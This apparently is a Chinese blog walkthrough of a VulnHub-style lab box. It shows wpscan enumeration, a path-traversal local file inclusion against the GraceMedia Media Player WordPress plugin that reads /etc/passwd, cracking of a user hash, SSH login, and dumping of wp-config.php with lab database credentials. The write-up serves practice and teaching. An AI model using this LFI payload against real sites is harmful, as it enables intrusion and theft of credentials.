----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-content/plugins/index.php (CODE:200|SIZE:0)                          </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-content/themes/index.php (CODE:200|SIZE:0)                           </span><br><span class="line">                                                                                                                      </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu Dec 19 00:39:22 2019</span><br><span class="line">DOWNLOADED: 36896 - FOUND: 13</span><br></pre></td></tr></table></figure>

<p>可以发现是wordpress程序搭建的,wpscan一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.101/tsweb/ -e ap,at,tt,cb</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.5</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://192.168.56.101/tsweb/</span></span><br><span class="line"><span class="string">[+] Started: Thu Dec 19 03:35:07 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.101/tsweb/</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.101/tsweb/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.101/tsweb/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Upload directory has listing enabled: http://192.168.56.101/tsweb/wp-content/uploads/</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.101/tsweb/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.3 identified (Insecure, released on 2019-11-12).</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: twentytwenty</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-12-13T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/readme.txt</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 1.1</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/style.css?ver=1.0</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Twenty</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentytwenty/</span></span><br><span class="line"><span class="string"> | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Css Style In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.0 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/style.css?ver=1.0, Match: &#x27;</span>Version: 1.0<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating All Plugins (via Passive Methods)</span></span><br><span class="line"><span class="string">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Plugin(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] gracemedia-media-player</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/</span></span><br><span class="line"><span class="string"> | Latest Version: 1.0 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2013-07-21T15:09:00.000Z</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.0 (100% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Readme - Stable Tag (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt</span></span><br><span class="line"><span class="string"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating All Themes (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:38 &lt;=======================================================================================================================================================&gt; (20466 / 20466) 100.00% Time: 00:00:38</span></span><br><span class="line"><span class="string">[+] Checking Theme Versions (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Theme(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] twentynineteen</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/themes/twentynineteen/</span></span><br><span class="line"><span class="string"> | Latest Version: 1.4 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-11-12T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.101/tsweb/wp-content/themes/twentynineteen/readme.txt</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.101/tsweb/wp-content/themes/twentynineteen/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Nineteen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentynineteen/</span></span><br><span class="line"><span class="string"> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Known Locations (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.4 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/themes/twentynineteen/style.css, Match: &#x27;</span>Version: 1.4<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] twentyseventeen</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/themes/twentyseventeen/</span></span><br><span class="line"><span class="string"> | Latest Version: 2.2 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-05-07T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.101/tsweb/wp-content/themes/twentyseventeen/readme.txt</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.101/tsweb/wp-content/themes/twentyseventeen/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Seventeen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span></span><br><span class="line"><span class="string"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Known Locations (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 2.2 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/themes/twentyseventeen/style.css, Match: &#x27;</span>Version: 2.2<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] twentysixteen</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/themes/twentysixteen/</span></span><br><span class="line"><span class="string"> | Latest Version: 2.0 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-05-07T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.101/tsweb/wp-content/themes/twentysixteen/readme.txt</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.101/tsweb/wp-content/themes/twentysixteen/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Sixteen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentysixteen/</span></span><br><span class="line"><span class="string"> | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Known Locations (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 2.0 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/themes/twentysixteen/style.css, Match: &#x27;</span>Version: 2.0<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] twentytwenty</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-12-13T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/readme.txt</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 1.1</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Twenty</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentytwenty/</span></span><br><span class="line"><span class="string"> | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Known Locations (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.0 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/style.css, Match: &#x27;</span>Version: 1.0<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:04 &lt;=========================================================================================================================================================&gt; (2575 / 2575) 100.00% Time: 00:00:04</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Timthumbs Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Config Backups - Time: 00:00:00 &lt;==============================================================================================================================================================&gt; (21 / 21) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Config Backups Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Thu Dec 19 03:35:57 2019</span></span><br><span class="line"><span class="string">[+] Requests Done: 23078</span></span><br><span class="line"><span class="string">[+] Cached Requests: 46</span></span><br><span class="line"><span class="string">[+] Data Sent: 5.699 MB</span></span><br><span class="line"><span class="string">[+] Data Received: 3.448 MB</span></span><br><span class="line"><span class="string">[+] Memory used: 239.552 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:49</span></span><br></pre></td></tr></table></figure>

<p>网上搜索gracemedia-media-player插件发现存在本地文件包含漏洞，参考文章<span class="exturl" data-url="aHR0cHM6Ly9jeHNlY3VyaXR5LmNvbS9pc3N1ZS9XTEItMjAxOTAzMDExMw==">WordPress GraceMedia Media Player 1.0 Local File Inclusion<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash </span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin </span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin </span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin </span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync </span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin </span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin </span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin </span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin </span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin </span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin </span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin </span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin </span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin </span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin </span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin </span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin </span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin </span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin </span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin </span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin </span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin </span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin </span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/<span class="literal">false</span> </span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin </span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin </span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin </span><br><span class="line">pollinate:x:109:1::/var/cache/pollinate:/bin/<span class="literal">false</span> </span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin </span><br><span class="line">rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash </span><br><span class="line">mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span> </span><br><span class="line">flag:<span class="variable">$1</span><span class="variable">$flag</span><span class="variable">$vqjCxzjtRc7PofLYS2lWf</span>/:1001:1003::/home/flag:/bin/rbash</span><br></pre></td></tr></table></figure>

<p>在此找到flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/,将$1$flag$vqjCxzjtRc7PofLYS2lWf/解密得到结果topsecret</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub75.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub74.jpg"></p>
<p>然后使用flag/topsecret连接ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh flag@192.168.56.101</span></span><br><span class="line">flag@192.168.56.101<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> System information disabled due to load higher than 4.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Canonical Livepatch is available for installation.</span></span><br><span class="line"><span class="string">   - Reduce system reboots and improve kernel security. Activate at:</span></span><br><span class="line"><span class="string">     https://ubuntu.com/livepatch</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">5 packages can be updated.</span></span><br><span class="line"><span class="string">0 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Ubuntu system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span></span><br><span class="line"><span class="string">applicable law.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Ubuntu system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span></span><br><span class="line"><span class="string">applicable law.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Thu Dec 19 09:18:02 2019 from 192.168.56.102</span></span><br><span class="line"><span class="string">Could not chdir to home directory /home/flag: No such file or directory</span></span><br><span class="line"><span class="string">flag@hacknos:/$ id</span></span><br><span class="line"><span class="string">uid=1001(flag) gid=1003(flag) groups=1003(flag)</span></span><br><span class="line"><span class="string">flag@hacknos:/$ whoami</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">flag@hacknos:/$ pwd</span></span><br><span class="line"><span class="string">/</span></span><br><span class="line"><span class="string">flag@hacknos:/$</span></span><br></pre></td></tr></table></figure>

<h3 id="找第一个flag"><a href="#找第一个flag" class="headerlink" title="找第一个flag"></a>找第一个flag</h3><p>继续从之前得到的ssh用户的flag账号开始入手getshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag@hacknos:/$ ls /var/www/html/tsweb/</span><br><span class="line">index.php    readme.html      wp-admin            wp-comments-post.php  wp-config-sample.php  wp-cron.php  wp-links-opml.php  wp-login.php  wp-settings.php  wp-trackback.php</span><br><span class="line">license.txt  wp-activate.php  wp-blog-header.php  wp-config.php         wp-content            wp-includes  wp-load.php        wp-mail.php   wp-signup.php    xmlrpc.php</span><br></pre></td></tr></table></figure>
<p>查看配置文件得到数据库的账号密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag@hacknos:/$ cat /var/www/html/tsweb/wp-config.php</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration <span class="keyword">for</span> WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * This file contains the following configurations:</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * * MySQL settings</span></span><br><span class="line"><span class="string"> * * Secret keys</span></span><br><span class="line"><span class="string"> * * Database table prefix</span></span><br><span class="line"><span class="string"> * * ABSPATH</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>wordpress<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>wpuser<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database password */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>hackNos-2.com<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL hostname */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_HOST<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_CHARSET<span class="string">&#x27;, &#x27;</span>utf8mb4<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** The Database Collate type. Don&#x27;</span>t change this <span class="keyword">if</span> <span class="keyword">in</span> doubt. */</span><br><span class="line">define( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">tsweb:</span><br><span class="line">define( <span class="string">&#x27;WP_SITEURL&#x27;</span>, <span class="string">&#x27;http://&#x27;</span> .<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="string">&#x27;/tsweb&#x27;</span>);</span><br><span class="line">define( <span class="string">&#x27;WP_HOME&#x27;</span>, <span class="string">&#x27;http://&#x27;</span> .<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="string">&#x27;/tsweb&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@+</span></span><br><span class="line"> * Authentication Unique Keys and Salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases!</span><br><span class="line"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="line"> * You can change these at any point <span class="keyword">in</span> time to invalidate all existing cookies. This will force all users to have to <span class="built_in">log</span> <span class="keyword">in</span> again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;Z ly&#125;&#125;yxO6baps19c+.Ze(sw:r$o1M.oFLN]1vwc,pkQ8l&#123;o`6%w8u*c`4#O&gt;[4S&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;lGjW6&#125;I8iVCK]/&lt;;cfBh`c[yB$^XIbt(m7%d-;kvA4LW&lt;qAgxNZsw3ogYw8&amp;Vp&lt;1&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;ntPjJGZO55`]ki&gt;qpn/np9(1uN;kA]-NKM&lt;&amp;g2HV(6&gt;IqG[^z&#125;^kMl&amp; &#125;FA#* Y#&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;Sd]xrTb,rC(s#-m.A|pExO4wJv$G|RjjVNR&#125;WPjj;T)uTGhLfsDt=4vHPo3lb./M&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;$EM:;(zkTmf6qvF3rU=|&#123;WhROYu7h.fIwB(Zmj8b17+OOPSebjm&amp;u&lt;~]xv_`eHR`&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;:lDagF8+F*&#123;wa7~Ap+J^d,aFhV*)j;&lt;&#123;T!&lt;[(X!C5~ZE;,B[v]uyJs7Df)G&#123;CL~2&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;Yh04TE3)wNX+H**.2UgS?E=&#125;2 6B*WPk&gt;kd$Fb.&amp;&amp;~J3UL^f+fL|IsM&#125;uh)&lt;O!RS&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;|Nmraflo$=2t!/,=oy;.,4nK43OwzrVX*H:KdVu$myoQ@VP^H.BP#pV8905gjj&#125;s&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used <span class="keyword">for</span> 